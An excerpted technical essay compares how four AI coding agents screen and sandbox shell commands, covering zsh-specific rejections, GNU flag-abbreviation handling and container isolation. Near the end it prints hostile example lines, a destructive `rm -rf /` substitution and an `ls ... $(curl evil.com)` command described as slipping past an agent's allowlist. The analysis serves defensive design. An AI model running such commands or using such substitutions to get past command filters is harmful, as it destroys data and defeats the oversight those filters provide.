...
## How four systems execute shell commands
...
This two-layer defense-in-depth is the heart of Codex's security design; any single-layer hole has the other layer as fallback.
...
This kind of "zsh module loading" defense is something almost only people who have written real-world zsh exploitation would think of.

Most bash safety solutions completely ignore the unique zsh attack surface, but Claude Code, being cross-platform developer-facing, must consider how zsh users actually execute commands. `emulate` is zsh's eval equivalent (executes a string as a command) and is also rejected.
...
The theoretical product is 3×3×3 = 27 combinations; the meaningful ones are about 12; ops pick a combination per scenario (e.g. sandbox + allowlist + on-miss for enterprise CI; gateway + full + off for trusted internal deployment).
...
GNU long flag abbreviation resolution is OpenClaw's unique capability among the 4 open-source agents. GNU tools support long flag abbreviations: as long as the abbreviation uniquely matches a complete flag, it takes effect.
...
This level of anti-obfuscation detail is unique to OpenClaw among the 4; the other three don't specially handle GNU long flag abbreviations.
...
Hermes picks a path completely opposite to the previous three. Its judgement: doing complex AST parsing + 23 checks + safe-bin profiles at the command layer has unsustainable maintenance overhead (every new trick discovered requires a new rule; rules may conflict), false positives and negatives can never be reduced to 0, and it's essentially an endless cat-and-mouse game with attackers; better to flip the thinking.

Accept "command layer can't catch all attacks" and put every command into a strong isolation environment, letting the container / sandbox at the syscall layer handle the fallback, so even if the command layer is bypassed, the host is unaffected.
...
## What shell execution already agrees on
...
## Trade parsing against policy and isolation
...
## My take: command execution must explain itself
...
## Build the smallest safe executor
...
## Four command pipelines, four outcomes
...
## Follow execution policy through source
...
The root issue: **shell syntax is not a regular language**. Constructs like `echo "hello $(rm -rf /)"` require a context-free grammar: quote nesting (`"'$(...)'"`), escapes, variable expansion, here-docs all exceed regex capacity.
...
Risk: an attacker forms `ls --color=auto -la $(curl evil.com)`; the model identifies "head token is ls" and lets it through, bypassing the sandbox.
...
Trade-off: legitimate workdirs with `(` or emoji get rejected, but 99% of paths look like `/home/user/projects/foo` or `C:\Users\...\foo`, so coverage is enough.
